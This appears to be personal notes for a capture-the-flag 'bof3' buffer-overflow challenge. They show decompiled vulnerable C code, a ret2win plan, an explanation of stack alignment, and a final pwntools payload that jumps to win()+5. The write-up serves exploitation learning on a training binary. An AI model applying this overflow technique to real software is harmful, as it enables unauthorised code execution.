- `file ./bof3`
  ![[bof3_JHT-1.png]]
- `pwndbg bof3` -> `checksec`
  ![[bof3_JHT-2.png]]
- decompile
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v5; // [rsp+1Ch] [rbp-4h]

  v5 = 0;
  init(argc, argv, envp);
  printf("> ");
  v5 = read(0, buf, 0x30uLL);
  if ( buf[v5 - 1] == '\n' )
    buf[v5 - 1] = 0;
  return 0;
}
```
- `win()` but no call in `main()` -> [[ret2win]]
- debug
  ![[bof3_JHT-3.png]]
- `buffer[48] = offset 40 + <win_addr>`
  ![[bof3_JHT-4.png]]
- but when run into `win()`,  `win()` will call a func that in glibc. 
- in this func, it will use `movaps xmm0, [rsp + ...]`, which requires the stack to be 16-byte aligned. when `ret` runs (in that func), it will automatically set the stack to be 16-byte aligned
  ![[bof3_JHT-5.png]]
- if we call <win_addr>, at `win + 4`, `push rbp` will subtract stack by 8 byte -> no longer 16-byte aligned -> jump to `win + 5`
  ![[bof3_JHT-6.png]]
- `payload = b"A"*40 + p64(elf.sym['win']+5)`